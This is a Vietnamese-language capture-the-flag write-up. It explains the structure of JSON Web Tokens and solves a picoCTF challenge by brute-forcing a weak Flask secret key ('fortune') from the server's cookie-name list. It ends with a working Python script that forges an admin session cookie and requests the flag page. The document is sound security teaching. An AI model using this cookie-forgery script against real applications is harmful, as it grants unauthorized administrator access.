# **JWT** #

## **JWT là gì ?** ##

- JWT là một phương tiện đại diện cho các yêu cầu chuyển giao giữa hai bên Client – Server , các thông tin trong chuỗi JWT được định dạng bằng JSON . Trong đó chuỗi Token phải có 3 phần là header , phần payload và phần signature được ngăn bằng dấu “.”

![](https://supertokens.com/static/b0172cabbcd583dd4ed222bdb83fc51a/9af93/jwt-structure.png)

- **`Signature`** : Phần chử ký này sẽ được tạo ra bằng cách mã hóa phần header , payload kèm theo một chuỗi secret (khóa bí mật)

```python
data = base64urlEncode( header ) + "." + base64urlEncode( payload )
signature = Hash( data, secret );
```

## **Khi nào sử dụng JSON Web Token** ##

- Khi người dùng đã đăng nhập vào hệ thống thì những request tiếp theo từ phía người dùng sẽ chứa theo các đoạn mã, cho phép người dùng cấp quyền truy cập vào url, service phướng pháp này không bị ảnh hưởng với CORS.

![](../../../WEB_SEC/img_web/jwt.png)

# **Thực chiến CTF** #

- Sau khi đọc source server.py và bài ra cũng đã hint cho ta bài này sẽ liên quan đến cookie cụ thể là  `Flask session cookies` .

- Đọc source server.py ta thấy để đọc được ta có:

```python
@app.route("/display", methods=["GET"])
def flag():
    if session.get("very_auth"):
        check = session["very_auth"]
        if check == "admin":
            resp = make_response(render_template(
                "flag.html", value=flag_value, title=title))
            return resp
        flash("That is a cookie! Not very special though...", "success")
        return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
    else:
        resp = make_response(redirect("/"))
        session["very_auth"] = "blank"
        return resp

```

- Điều để ý ở đây là `session["very_auth"] = admin`, khi mở trình duyệt lên và xem cookie
nó như được mã hóa bằng JWT token.

```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Y-TuRg.k5n4msf5gh1KVdDP82GnW7gu81A
```

- Đưa vào web [jwt.io](https://jwt.io/) ta sẽ thấy rõ cookie .

![](../../../WEB_SEC/img_web/jwt_most_cookie.png)

- Đọc code thì mình đã thấy secret_key là ột trong những cookie_name và mình đã tạo file wordlist.txt để dùng tool tìm secret_key.

```python
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz",
                "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```

- [`Tool Flask Unsign`](https://pypi.org/project/flask-unsign/) là một công cụ có thể decode ra jwt token và đồng thời brup force ra `secret_key = 'fortune'`

![](../../../WEB_SEC/img_web/flask.png)

- Sau khi tìm được secret key chúng ta sẽ brup force gửi request đến web và lấy flag

- Đây là script.py gửi request lên pico và lấy flag.

```python
import requests
import sys
import zlib
from itsdangerous import base64_decode
import ast
# Lib for argument parsing
import argparse

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        session_cookie_structure = dict(
            ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e


payload = "{'very_auth':'admin'}"
url = "http://mercury.picoctf.net:65344/display"
new_cookie = encode('fortune', payload)
r = requests.get(url, cookies={"session": new_cookie})
print(r.text)

```
